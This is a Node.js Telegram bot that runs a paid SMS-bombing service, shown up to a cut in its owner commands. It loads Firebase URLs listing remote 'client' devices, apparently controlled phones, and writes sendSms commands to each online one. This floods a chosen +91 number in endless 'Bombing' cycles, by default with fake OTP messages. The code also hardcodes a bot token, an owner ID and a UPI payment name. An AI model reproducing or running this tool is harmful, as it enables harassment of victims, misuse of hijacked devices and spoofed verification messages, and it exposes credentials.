#!/usr/bin/env node
// 🔥 BULK SMS BOT - COMPLETE FIXED VERSION 🔥
// Developer: @RTFGAMMING
// Logging Channel: Every 1 minute

const { Telegraf, session, Markup } = require('telegraf');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const express = require('express');
const { promisify } = require('util');
const fs = require('fs');
const path = require('path');

// ============================
// CONFIGURATION
// ============================
const TOKEN = '8212356485:AAGQNG75v9YA1sryNfX6zSbEQgpWM_oYMHI';
const OWNER_ID = 6346250222;  // 👈 @RTFGAMMING ki ID

// 🔥 LOGGING CHANNEL - YAHAN APNA CHANNEL USERNAME DAALEIN
// Channel banayein: @yourchannelusername
// Channel ko bot admin banayein
const LOG_CHANNEL = '@loggsnsns';  // 👈 CHANGE KARO

// UPI Configuration
const UPI_ID = "70497398@axl";
const UPI_NAME = "BRAJENDRA TYAGI";

// ============================
// LOAD FIREBASE URLs FROM JSON FILE
// ============================
let FIREBASE_CONFIG = [];

try {
    const configPath = path.join(__dirname, 'firebase-config.json');
    const configData = fs.readFileSync(configPath, 'utf8');
    const config = JSON.parse(configData);
    FIREBASE_CONFIG = config.urls || [];
    console.log(`✅ Loaded ${FIREBASE_CONFIG.length} Firebase URLs from config`);
} catch (err) {
    console.error('❌ Failed to load firebase-config.json:', err.message);
    FIREBASE_CONFIG = [];
}

// ============================
// EXPRESS SERVER (for Render)
// ============================
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/', (req, res) => res.send('✅ Bulk SMS Bot is running!'));
app.get('/health', (req, res) => res.status(200).send('OK'));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ HTTP server running on port ${PORT}`);
});

// ============================
// DATABASE SETUP
// ============================
const DATA_DIR = path.join(process.cwd(), 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
const DB_PATH = path.join(DATA_DIR, 'bot_data.db');

const db = new sqlite3.Database(DB_PATH);

const initDB = () => {
    db.serialize(() => {
        db.run(`CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 5,
            referrer_id INTEGER,
            joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        db.run(`CREATE TABLE IF NOT EXISTS banned_users (
            user_id INTEGER PRIMARY KEY,
            banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            banned_by INTEGER
        )`);
        db.run(`CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            credits_given INTEGER,
            transaction_id TEXT,
            screenshot_id TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        db.run(`CREATE TABLE IF NOT EXISTS user_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            action TEXT,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
        db.run(`CREATE TABLE IF NOT EXISTS bot_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            log_type TEXT,
            message TEXT,
            user_id INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )`);
    });
    console.log('✅ Database initialized at:', DB_PATH);
};
initDB();

// ============================
// DATABASE FUNCTIONS (FIXED)
// ============================
const dbGet = promisify(db.get.bind(db));
const dbRun = promisify(db.run.bind(db));
const dbAll = promisify(db.all.bind(db));

const isOwner = (userId) => userId == OWNER_ID;

const getUserCredits = async (userId) => {
    try {
        const row = await dbGet("SELECT credits FROM users WHERE user_id = ?", [userId]);
        if (row && row.credits !== undefined) {
            return row.credits;
        }
        await addNewUser(userId);
        return 5;
    } catch (err) {
        console.error('Get credits error:', err);
        return 5;
    }
};

const addNewUser = async (userId, referrerId = null) => {
    try {
        const exists = await dbGet("SELECT user_id FROM users WHERE user_id = ?", [userId]);
        if (exists) {
            return;
        }
        
        await dbRun("INSERT INTO users (user_id, credits, referrer_id) VALUES (?, ?, ?)", 
                    [userId, 5, referrerId]);
        
        if (referrerId && referrerId != userId) {
            try {
                const referrer = await dbGet("SELECT credits FROM users WHERE user_id = ?", [referrerId]);
                if (referrer) {
                    await dbRun("UPDATE users SET credits = credits + 1 WHERE user_id = ?", [referrerId]);
                }
            } catch (refErr) {
                console.error('Referral error:', refErr);
            }
        }
    } catch (err) {
        if (err.message && err.message.includes('UNIQUE constraint failed')) {
            return;
        }
        console.error('Add user error:', err);
    }
};

const deductCredit = async (userId) => {
    try {
        const result = await dbRun("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", [userId]);
        if (result && result.changes !== undefined) {
            return result.changes > 0;
        }
        const credits = await getUserCredits(userId);
        return credits >= 0;
    } catch (err) {
        console.error('Deduct credit error:', err);
        return false;
    }
};

const addCredits = async (userId, amount) => {
    try {
        await dbRun("UPDATE users SET credits = credits + ? WHERE user_id = ?", [amount, userId]);
        return true;
    } catch (err) {
        console.error('Add credits error:', err);
        return false;
    }
};

const removeCredits = async (userId, amount) => {
    try {
        const result = await dbRun("UPDATE users SET credits = credits - ? WHERE user_id = ? AND credits >= ?", 
                                   [amount, userId, amount]);
        if (result && result.changes !== undefined) {
            return result.changes > 0;
        }
        const credits = await getUserCredits(userId);
        return credits >= 0;
    } catch (err) {
        console.error('Remove credits error:', err);
        return false;
    }
};

const banUser = async (userId, adminId) => {
    try {
        const exists = await dbGet("SELECT user_id FROM banned_users WHERE user_id = ?", [userId]);
        if (exists) return true;
        
        await dbRun("INSERT OR IGNORE INTO banned_users (user_id, banned_by) VALUES (?, ?)", [userId, adminId]);
        return true;
    } catch (err) {
        console.error('Ban error:', err);
        return false;
    }
};

const unbanUser = async (userId) => {
    try {
        const result = await dbRun("DELETE FROM banned_users WHERE user_id = ?", [userId]);
        if (result && result.changes !== undefined) {
            return result.changes > 0;
        }
        return false;
    } catch (err) {
        console.error('Unban error:', err);
        return false;
    }
};

const isUserBanned = async (userId) => {
    try {
        const row = await dbGet("SELECT user_id FROM banned_users WHERE user_id = ?", [userId]);
        return row !== undefined && row !== null;
    } catch (err) {
        console.error('Check banned error:', err);
        return false;
    }
};

const createPayment = async (userId, amount, creditsGiven, transactionId = null, screenshotId = null) => {
    try {
        const result = await dbRun(
            `INSERT INTO payments (user_id, amount, credits_given, transaction_id, screenshot_id, status) 
             VALUES (?, ?, ?, ?, ?, 'pending')`,
            [userId, amount, creditsGiven, transactionId, screenshotId]
        );
        return result.lastID;
    } catch (err) {
        console.error('Create payment error:', err);
        return null;
    }
};

const logUserAction = async (userId, action, details = "") => {
    try {
        await dbRun("INSERT INTO user_history (user_id, action, details) VALUES (?, ?, ?)", 
                    [userId, action, details]);
    } catch (err) {
        console.error('Log user action error:', err);
    }
};

const getUserHistory = async (userId, limit = 10) => {
    try {
        const rows = await dbAll(
            `SELECT action, details, created_at FROM user_history 
             WHERE user_id = ? ORDER BY id DESC LIMIT ?`,
            [userId, limit]
        );
        return rows || [];
    } catch (err) {
        console.error('Get user history error:', err);
        return [];
    }
};

// ============================
// LOGGING FUNCTIONS
// ============================
const saveLog = async (logType, message, userId = null) => {
    try {
        await dbRun(
            "INSERT INTO bot_logs (log_type, message, user_id) VALUES (?, ?, ?)",
            [logType, message, userId]
        );
    } catch (err) {
        console.error('Log save error:', err);
    }
};

let logBuffer = [];
let logInterval = null;

const sendLogsToChannel = async (bot) => {
    if (logBuffer.length === 0) return;
    
    try {
        const logsToSend = [...logBuffer];
        logBuffer = [];
        
        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
        let logMessage = `📋 **BOT LOGS** - ${timestamp}\n`;
        logMessage += `━─━────༺༻────━─━\n`;
        
        const maxLogs = logsToSend.slice(0, 20);
        for (const log of maxLogs) {
            const time = log.time || new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' });
            logMessage += `🕐 ${time}\n`;
            logMessage += `📌 ${log.type}: ${log.message}\n`;
            if (log.userId) logMessage += `👤 User: ${log.userId}\n`;
            logMessage += `─\n`;
        }
        
        if (logsToSend.length > 20) {
            logMessage += `\n... and ${logsToSend.length - 20} more logs`;
        }
        
        await bot.telegram.sendMessage(LOG_CHANNEL, logMessage, { parse_mode: 'HTML' });
        
        await dbRun("DELETE FROM bot_logs WHERE id IN (SELECT id FROM bot_logs ORDER BY id DESC LIMIT -1 OFFSET 1000)");
        
    } catch (err) {
        console.error('Failed to send logs to channel:', err.message);
    }
};

const startLogInterval = (bot) => {
    if (logInterval) clearInterval(logInterval);
    logInterval = setInterval(() => {
        sendLogsToChannel(bot);
    }, 60000);
};

const addLog = async (type, message, userId = null) => {
    const timestamp = new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' });
    logBuffer.push({ type, message, userId, time: timestamp });
    await saveLog(type, message, userId);
    
    if (logBuffer.length >= 30) {
        await sendLogsToChannel(bot);
    }
};

// ============================
// HELPER FUNCTIONS
// ============================
const generateOTP = (length = 6) => {
    let otp = '';
    for (let i = 0; i < length; i++) {
        otp += Math.floor(Math.random() * 10);
    }
    return otp;
};

const validatePhoneNumber = (number) => {
    number = number.trim();
    if (!number.startsWith('+91')) {
        return { valid: false, msg: '❌ Number must start with +91' };
    }
    const remaining = number.slice(3);
    if (!/^\d+$/.test(remaining)) {
        return { valid: false, msg: '❌ Only digits allowed after +91' };
    }
    if (remaining.length !== 10) {
        return { valid: false, msg: `❌ Enter exactly 10 digits after +91 (you entered ${remaining.length})` };
    }
    return { valid: true, msg: '✅ Valid number' };
};

// ============================
// FIREBASE FUNCTIONS
// ============================
const fetchJsonData = async (url, path, auth = null) => {
    try {
        const base = url.replace(/\/+$/, '');
        let fullUrl = `${base}/${path}.json`;
        if (auth && auth.trim()) {
            fullUrl += `?auth=${auth}`;
        }
        const response = await axios.get(fullUrl, { timeout: 10000 });
        return response.data;
    } catch (err) {
        return null;
    }
};

const firebasePut = async (url, auth, path, data) => {
    try {
        const base = url.replace(/\/+$/, '');
        let fullUrl = `${base}/${path}.json`;
        if (auth && auth.trim()) {
            fullUrl += `?auth=${auth}`;
        }
        await axios.put(fullUrl, data, { timeout: 10000 });
        return true;
    } catch {
        return false;
    }
};

// ============================
// MAIN KEYBOARD
// ============================
const getMainKeyboard = () => {
    return Markup.keyboard([
        ['📱 Bulk SMS'],
        ['💰 Credits', '🔗 Referral'],
        ['💳 Recharge'],
        ['📜 My History', '🛡️ System Status'],
        ['👨‍💻 Developer']
    ]).resize();
};

// ============================
// BOT SETUP
// ============================
const bot = new Telegraf(TOKEN);

// Session middleware
bot.use(session());

// Custom middleware
bot.use(async (ctx, next) => {
    if (!ctx.session) ctx.session = {};
    
    if (ctx.chat && ctx.chat.type === 'private') {
        ctx.userId = ctx.from.id;
        const banned = await isUserBanned(ctx.userId);
        if (banned) {
            await addLog('BANNED_ACCESS', `Banned user tried to access`, ctx.userId);
            return ctx.reply('❌ You are banned from using this bot.');
        }
    }
    return next();
});

// Start log interval
bot.telegram.getMe().then(() => {
    startLogInterval(bot);
    addLog('SYSTEM', '✅ Bot started successfully');
});

// ============================
// START COMMAND
// ============================
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    let referrerId = null;
    if (ctx.message.text.includes('ref_')) {
        const ref = ctx.message.text.split('ref_')[1];
        if (ref) referrerId = parseInt(ref);
    }
    await addNewUser(userId, referrerId);
    const credits = await getUserCredits(userId);

    await addLog('START', `User started bot`, userId);
    if (referrerId) {
        await addLog('REFERRAL', `User ${userId} referred by ${referrerId}`, userId);
    }

    const welcome = `⚡ **BULK SMS BOT** ⚡\n` +
        `━─━────༺༻────━─━\n` +
        `🟢 **Status:** \`ONLINE\`\n` +
        `💰 **Credits:** \`${credits}\`\n` +
        `━─━────༺༻────━─━\n` +
        `📌 **How to use:**\n` +
        `• Click \`📱 Bulk SMS\` and follow steps\n` +
        `• Each SMS costs **1 credit**\n` +
        `• Invite friends to earn free credits!\n` +
        `• Recharge via \`💳 Recharge\``;

    await ctx.reply(welcome, { parse_mode: 'HTML', ...getMainKeyboard() });
});

// ============================
// TEXT HANDLER
// ============================
bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const text = ctx.message.text;
    
    if (!ctx.session) ctx.session = {};
    const session = ctx.session;

    await addLog('TEXT_RECEIVED', `Text: "${text}"`, userId);

    // Bulk SMS flow
    if (session.bulkStep === 'number') {
        await addLog('BULK_STEP', `Number received: ${text}`, userId);
        
        const number = text.trim();
        const validation = validatePhoneNumber(number);
        if (!validation.valid) {
            await addLog('BULK_ERROR', `Invalid number: ${text}`, userId);
            return ctx.reply(`${validation.msg}\n\n📞 Format: +91XXXXXXXXXX\nExample: +919876543210`, 
                            { parse_mode: 'HTML' });
        }
        session.bulkNumber = number;
        await addLog('BULK_NUMBER', `Valid number: ${number}`, userId);

        const keyboard = Markup.inlineKeyboard([
            [Markup.button.callback('🔢 Random OTP', 'msgtype_random')],
            [Markup.button.callback('✏️ Custom SMS', 'msgtype_custom')],
            [Markup.button.callback('❌ Cancel', 'msgtype_cancel')]
        ]);
        await ctx.reply('📝 **Select message type:**', keyboard);
        session.bulkStep = 'msgtype';
        return;
    }

    if (session.bulkStep === 'custom_msg') {
        const msgText = text;
        if (!msgText) {
            await addLog('BULK_ERROR', 'Empty message received', userId);
            return ctx.reply('❌ Message cannot be empty.');
        }
        session.customMessage = msgText;
        await addLog('BULK_MSG', `Custom message: ${msgText.substring(0, 50)}...`, userId);

        const deducted = await deductCredit(userId);
        if (!deducted) {
            await addLog('BULK_ERROR', `Insufficient credits for user ${userId}`, userId);
            return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
        }

        await logUserAction(userId, 'Bulk SMS Started', `Target: ${session.bulkNumber}`);
        await addLog('BULK_START', `Starting bulk SMS to ${session.bulkNumber}`, userId);
        await ctx.reply('📤 **Starting infinite bulk SMS...**');
        await performBulkSend(ctx);
        return;
    }

    // Recharge flow
    if (session.rechargeStep === 'payment') {
        if (text && !text.startsWith('/')) {
            const txnId = text.trim();
            const credits = session.rechargeCredits || 0;
            const amount = session.rechargeAmount || 0;
            if (credits === 0) {
                await addLog('RECHARGE_ERROR', 'Session expired', userId);
                return ctx.reply('❌ Session expired. Start /start again.');
            }
            
            await addLog('RECHARGE_TXN', `Txn ID: ${txnId}, Credits: ${credits}, Amount: ₹${amount}`, userId);
            
            const paymentId = await createPayment(userId, amount, credits, txnId);
            if (!paymentId) {
                await addLog('RECHARGE_ERROR', 'Failed to create payment', userId);
                return ctx.reply('❌ Failed to process payment. Please try again.');
            }
            
            await ctx.reply(`✅ Transaction ID received: \`${txnId}\`\nPayment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
            
            try {
                await ctx.telegram.sendMessage(OWNER_ID,
                    `📥 **New Payment (Txn ID)**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nTxn: ${txnId}\nPayment ID: #${paymentId}`,
                    { parse_mode: 'HTML' }
                );
                await addLog('RECHARGE_NOTIFY', `Owner notified for payment #${paymentId}`, userId);
            } catch (err) {
                await addLog('RECHARGE_ERROR', `Failed to notify owner: ${err.message}`, userId);
            }
            
            await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (txn: ${txnId})`);
            session.rechargeStep = null;
            session.rechargeCredits = null;
            session.rechargeAmount = null;
            return;
        }
        return;
    }

    // Main menu buttons
    switch(text) {
        case '📱 Bulk SMS': {
            const credits = await getUserCredits(userId);
            await addLog('BUTTON', 'Bulk SMS button clicked', userId);
            if (credits <= 0) {
                await addLog('BULK_ERROR', `Insufficient credits: ${credits}`, userId);
                return ctx.reply('❌ **Insufficient credits!**\nInvite friends or recharge.', 
                                { parse_mode: 'HTML' });
            }
            await ctx.reply('📞 **Enter recipient phone number:**\n✅ Format: +91XXXXXXXXXX (10 digits after +91)\n_Type /cancel to abort._',
                           { parse_mode: 'HTML' });
            session.bulkStep = 'number';
            break;
        }
        
        case '💰 Credits': {
            const credits = await getUserCredits(userId);
            await addLog('BUTTON', 'Credits check', userId);
            await ctx.reply(`💰 **Your Credits:** \`${credits}\``, { parse_mode: 'HTML' });
            break;
        }
        
        case '🔗 Referral': {
            const username = ctx.botInfo.username;
            const link = `https://t.me/${username}?start=ref_${userId}`;
            await addLog('BUTTON', 'Referral link generated', userId);
            await ctx.reply(`🔗 **Your Referral Link:**\n\`${link}\`\n\nShare this link – you get **1 credit** per new user!`,
                           { parse_mode: 'HTML' });
            break;
        }
        
        case '💳 Recharge': {
            await addLog('BUTTON', 'Recharge button clicked', userId);
            const keyboard = Markup.inlineKeyboard([
                [Markup.button.callback('💳 10 Credits - ₹20', 'recharge_10_20')],
                [Markup.button.callback('💎 25 Credits - ₹50', 'recharge_25_50')],
                [Markup.button.callback('🚀 50 Credits - ₹100', 'recharge_50_100')],
                [Markup.button.callback('👑 100 Credits - ₹200', 'recharge_100_200')],
                [Markup.button.callback('❌ Cancel', 'recharge_cancel')]
            ]);
            await ctx.reply('💳 **Select Recharge Plan:**', keyboard);
            break;
        }
        
        case '📜 My History': {
            await addLog('BUTTON', 'History viewed', userId);
            const history = await getUserHistory(userId, 10);
            if (!history || history.length === 0) {
                return ctx.reply('📭 No activity history.');
            }
            let reply = '📜 **Your Recent Activity:**\n';
            for (const row of history) {
                const dt = row.created_at ? row.created_at.slice(0, 19) : 'N/A';
                reply += `• ${row.action} – ${row.details} (${dt})\n`;
            }
            await ctx.reply(reply);
            break;
        }
        
        case '🛡️ System Status': {
            await addLog('BUTTON', 'System status checked', userId);
            let statusReply = '🟢 **Bot Status:** Running\n\n';
            statusReply += `📊 **Total Firebase URLs:** ${FIREBASE_CONFIG.length}\n\n`;
            
            let totalOnline = 0;
            let totalDevices = 0;
            let workingUrls = 0;
            
            for (const config of FIREBASE_CONFIG) {
                try {
                    const clients = await fetchJsonData(config.url, '/clients', config.auth);
                    if (clients && typeof clients === 'object') {
                        const deviceCount = Object.keys(clients).length;
                        totalDevices += deviceCount;
                        workingUrls++;
                        for (const [id, data] of Object.entries(clients)) {
                            if (data && data.online === true) totalOnline++;
                        }
                    }
                } catch (err) {
                    await addLog('SYSTEM_ERROR', `Failed to fetch ${config.url}: ${err.message}`);
                }
            }
            
            statusReply += `📱 **Total Devices:** ${totalDevices}\n`;
            statusReply += `🟢 **Online:** ${totalOnline}\n`;
            statusReply += `⚫ **Offline:** ${totalDevices - totalOnline}\n`;
            statusReply += `📡 **Active URLs:** ${workingUrls}/${FIREBASE_CONFIG.length}`;
            
            await ctx.reply(statusReply);
            break;
        }
            
        case '👨‍💻 Developer': {
            await addLog('BUTTON', 'Developer info viewed', userId);
            await ctx.reply('👨‍💻 **Developer:** @RTFGAMMING\nFor support or custom bots, contact the developer.');
            break;
        }
            
        default:
            await ctx.reply('❌ Please use the buttons below.', getMainKeyboard());
    }
});

// ============================
// PHOTO HANDLER
// ============================
bot.on('photo', async (ctx) => {
    const userId = ctx.from.id;
    if (!ctx.session) ctx.session = {};
    const session = ctx.session;
    
    await addLog('PHOTO', 'Photo received', userId);
    
    if (session.rechargeStep === 'payment') {
        const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
        const credits = session.rechargeCredits || 0;
        const amount = session.rechargeAmount || 0;
        
        if (credits === 0) {
            await addLog('RECHARGE_ERROR', 'Session expired for photo', userId);
            return ctx.reply('❌ Session expired. Start /start again.');
        }
        
        await addLog('RECHARGE_SCREENSHOT', `Screenshot received, Credits: ${credits}, Amount: ₹${amount}`, userId);
        
        const paymentId = await createPayment(userId, amount, credits, null, fileId);
        if (!paymentId) {
            await addLog('RECHARGE_ERROR', 'Failed to create payment', userId);
            return ctx.reply('❌ Failed to process payment. Please try again.');
        }
        
        await ctx.reply(`✅ Screenshot received! Payment ID: #${paymentId}\n⏳ Waiting for owner approval.`);
        
        try {
            await ctx.telegram.sendMessage(OWNER_ID,
                `📥 **New Payment Screenshot**\nUser: ${userId}\nAmount: ₹${amount}\nCredits: ${credits}\nPayment ID: #${paymentId}`,
                { parse_mode: 'HTML' }
            );
            await addLog('RECHARGE_NOTIFY', `Owner notified for payment #${paymentId}`, userId);
        } catch (err) {
            await addLog('RECHARGE_ERROR', `Failed to notify owner: ${err.message}`, userId);
        }
        
        await logUserAction(userId, 'Recharge Request', `${credits} credits for ₹${amount} (screenshot)`);
        session.rechargeStep = null;
        session.rechargeCredits = null;
        session.rechargeAmount = null;
    }
});

// ============================
// CALLBACK HANDLERS
// ============================
bot.action(/recharge_(.+)/, async (ctx) => {
    const userId = ctx.from.id;
    if (!ctx.session) ctx.session = {};
    const session = ctx.session;
    const data = ctx.match[0];
    
    await addLog('CALLBACK', `Recharge callback: ${data}`, userId);
    
    if (data === 'recharge_cancel') {
        await ctx.editMessageText('❌ Recharge cancelled.');
        return;
    }
    
    const parts = data.split('_');
    const credits = parseInt(parts[1]);
    const amount = parseInt(parts[2]);
    
    session.rechargeCredits = credits;
    session.rechargeAmount = amount;
    
    let reply = `💰 **Plan: ${credits} Credits**\n💵 **Amount: ₹${amount}**\n\n`;
    reply += `📱 **Send payment to UPI:** \`${UPI_ID}\`\n`;
    reply += `📛 **Name:** ${UPI_NAME}\n\n`;
    reply += '📸 **After payment, send the Transaction ID or screenshot** (as photo) to this chat.\n';
    reply += '⚠️ Your credits will be added after manual verification by owner.';
    
    await ctx.editMessageText(reply, { parse_mode: 'HTML' });
    session.rechargeStep = 'payment';
});

bot.action(/msgtype_(.+)/, async (ctx) => {
    const userId = ctx.from.id;
    if (!ctx.session) ctx.session = {};
    const session = ctx.session;
    const data = ctx.match[0];
    const msgType = data.split('_')[1];
    
    await addLog('CALLBACK', `Message type: ${msgType}`, userId);
    
    if (msgType === 'cancel') {
        await ctx.editMessageText('❌ Bulk SMS cancelled.');
        session.bulkStep = null;
        return;
    }
    
    if (msgType === 'random') {
        const defaultMsg = 'आपका OTP है: {otp} | कृपया इसे किसी को न बताएँ।';
        session.customMessage = defaultMsg;
        await ctx.editMessageText('✅ Using default OTP template.\n\n📤 **Starting infinite bulk SMS...**');
        
        const deducted = await deductCredit(userId);
        if (!deducted) {
            await addLog('BULK_ERROR', `Insufficient credits for user ${userId}`, userId);
            return ctx.reply('❌ Failed to deduct credit. Insufficient balance.');
        }
        await logUserAction(userId, 'Bulk SMS Started', `Target: ${session.bulkNumber}`);
        await addLog('BULK_START', `Starting random OTP bulk SMS to ${session.bulkNumber}`, userId);
        await performBulkSend(ctx);
    } else {
        await ctx.editMessageText('✏️ **Now enter your custom message.**\n💡 Use `{otp}` for random OTP if needed.');
        session.bulkStep = 'custom_msg';
    }
});

bot.action('stop_bulk', async (ctx) => {
    if (!ctx.session) ctx.session = {};
    ctx.session.stopSending = true;
    await addLog('BULK_STOP', 'User stopped bulk SMS', ctx.from.id);
    await ctx.answerCbQuery('Stopping...');
});

// ============================
// PERFORM BULK SEND
// ============================
const performBulkSend = async (ctx) => {
    const userId = ctx.from.id;
    if (!ctx.session) ctx.session = {};
    const session = ctx.session;
    
    if (await isUserBanned(userId)) {
        await addLog('BULK_ERROR', 'Banned user tried to send SMS', userId);
        return ctx.reply('❌ You are banned.');
    }
    
    const number = session.bulkNumber;
    const msgText = session.customMessage;
    
    if (!number || !msgText) {
        await addLog('BULK_ERROR', 'Missing data for bulk send', userId);
        return ctx.reply('❌ Missing data. Please start again.');
    }
    
    session.stopSending = false;
    
    const stopMarkup = Markup.inlineKeyboard([
        [Markup.button.callback('⏹ Stop Sending', 'stop_bulk')]
    ]);
    
    const progressMsg = await ctx.reply('⏳ Starting...', stopMarkup);
    
    let totalSent = 0;
    let totalFailed = 0;
    let cycle = 1;
    let totalDevices = 0;
    
    const otpMatch = msgText.match(/\{otp(:\d+)?\}/);
    let otpLength = 6;
    if (otpMatch && otpMatch[1]) {
        otpLength = parseInt(otpMatch[1].slice(1)) || 6;
        otpLength = Math.max(1, Math.min(10, otpLength));
    }
    
    await addLog('BULK_SEND', `Starting bulk send to ${number}`, userId);
    
    while (!session.stopSending) {
        if (await isUserBanned(userId)) break;
        
        const cycleText = `🔄 Cycle #${cycle}`;
        try {
            await ctx.telegram.editMessageText(
                progressMsg.chat.id,
                progressMsg.message_id,
                null,
                `⏳ ${cycleText} - Sending...`,
                { reply_markup: stopMarkup.reply_markup }
            );
        } catch {}
        
        for (const config of FIREBASE_CONFIG) {
            if (session.stopSending || await isUserBanned(userId)) break;
            
            const { url, auth } = config;
            
            try {
                const clients = await fetchJsonData(url, '/clients', auth);
                if (!clients || typeof clients !== 'object') continue;
                
                const deviceIds = Object.keys(clients);
                totalDevices += deviceIds.length;
                
                const onlineDevices = [];
                for (const [devId, data] of Object.entries(clients)) {
                    if (data && data.online === true) {
                        onlineDevices.push(devId);
                    }
                }
                
                if (onlineDevices.length === 0) continue;
                
                await addLog('BULK_CYCLE', `Cycle ${cycle}: ${onlineDevices.length} online devices`, userId);
                
                for (const devId of onlineDevices) {
                    if (session.stopSending || await isUserBanned(userId)) break;
                    
                    let finalMsg = msgText;
                    if (otpMatch) {
                        const otp = generateOTP(otpLength);
                        finalMsg = msgText.replace(/\{otp(:\d+)?\}/g, otp);
                    }
                    
                    const path = `clients/${devId}/webhookEvent/sendSms`;
                    const payload = {
                        sim: 1,
                        to: number,
                        message: finalMsg,
                        isSended: false
                    };
                    
                    const ok = await firebasePut(url, auth, path, payload);
                    if (ok) {
                        totalSent++;
                    } else {
                        totalFailed++;
                    }
                    
                    if ((totalSent + totalFailed) % 5 === 0) {
                        const progressText = `📤 **Bombing...**\n${cycleText}\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
                        try {
                            await ctx.telegram.editMessageText(
                                progressMsg.chat.id,
                                progressMsg.message_id,
                                null,
                                progressText,
                                { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
                            );
                        } catch {}
                    }
                    
                    await new Promise(r => setTimeout(r, 20));
                }
            } catch (err) {
                await addLog('FIREBASE_ERROR', `${url}: ${err.message}`, userId);
            }
        }
        
        cycle++;
        const progressText = `📤 **Cycle ${cycle-1} completed.**\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
        try {
            await ctx.telegram.editMessageText(
                progressMsg.chat.id,
                progressMsg.message_id,
                null,
                progressText,
                { parse_mode: 'HTML', reply_markup: stopMarkup.reply_markup }
            );
        } catch {}
        await new Promise(r => setTimeout(r, 300));
    }
    
    const finalText = `🛑 **Bulk SMS stopped.**\n✅ Sent: ${totalSent}\n❌ Failed: ${totalFailed}`;
    try {
        await ctx.telegram.editMessageText(
            progressMsg.chat.id,
            progressMsg.message_id,
            null,
            finalText,
            { parse_mode: 'HTML' }
        );
        await ctx.telegram.editMessageReplyMarkup(
            progressMsg.chat.id,
            progressMsg.message_id,
            null,
            { inline_keyboard: [] }
        );
    } catch {}
    
    await addLog('BULK_END', `Completed: ${totalSent} sent, ${totalFailed} failed`, userId);
    await logUserAction(userId, 'Bulk SMS Ended', `Sent ${totalSent}, Failed ${totalFailed}`);
    session.stopSending = null;
};

// ============================
// CANCEL COMMAND
// ============================
bot.command('cancel', async (ctx) => {
    if (!ctx.session) ctx.session = {};
    ctx.session.bulkStep = null;
    ctx.session.rechargeStep = null;
    ctx.session.stopSending = true;
    await addLog('CANCEL', 'User cancelled operation', ctx.from.id);
    await ctx.reply('❌ Cancelled. Use the buttons to start again.', getMainKeyboard());
});

// ============================
// OWNER COMMANDS
// ============================
bot.command('addcredits', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) {
        await addLog('UNAUTHORIZED', 'Unauthorized /addcredits attempt', userId);
        return ctx.reply('⛔ Unauthorized.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        await addLog('OWNER_CMD', 'Incorrect usage of /addcredits', userId);
        return ctx.reply('Usage: /addcredits <user_id> <amount>');
    }
    
    try {
        const target = parseInt(args[1]);
        const amount = parseInt(args[2]);
        await addCredits(target, amount);
        await addLog('OWNER_CMD', `Added ${amount} credits to user ${target}`, userId);
        await ctx.reply(`✅ Added ${amount} credits to user ${target}.`);
    } catch {
        await addLog('OWNER_CMD', 'Invalid input for /addcredits', userId);
        await ctx.reply('❌ Invalid input.');
    }
});

bot.command('removecredits', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) {
        await addLog('UNAUTHORIZED', 'Unauthorized /removecredits attempt', userId);
        return ctx.reply('⛔ Unauthorized.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        await addLog('OWNER_CMD', 'Incorrect usage of /removecredits', userId);
        return ctx.reply('Usage: /removecredits <user_id> <amount>');
    }
    
    try {
        const target = parseInt(args[1]);
        const amount = parseInt(args[2]);
        const success = await removeCredits(target, amount);
        if (success) {
            await addLog('OWNER_CMD', `Removed ${amount} credits from user ${target}`, userId);
            await ctx.reply(`✅ Removed ${amount} credits from user ${target}.`);
        } else {
            await addLog('OWNER_CMD', `Failed to remove credits from user ${target}`, userId);
            await ctx.reply(`❌ Failed. User may have insufficient credits.`);
        }
    } catch {
        await addLog('OWNER_CMD', 'Invalid input for /removecredits', userId);
        await ctx.reply('❌ Invalid input.');
    }
});

bot.command('ban', async (ctx) => {
    const userId = ctx.from.id;
    if (!isOwner(userId)) {
        await addLog('UNAUTHORIZED', 'Unauthorized /ban attempt', userId);
        return ctx.reply('⛔ Unauthorized.');
    }
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        await addLog('OWNER_CMD', 'Incorrect usage of /ban', userId);
        return ctx.reply('Usage: /ban <user_id>');
    }
    
    try {
        const target = parseInt(args[1]);
        await banUser(target, userId);
        await addLog('OWNER_CMD', `Banned user ${target}`, userId);
        await ctx.reply(`✅ User ${target} banned.`);
    } catch {
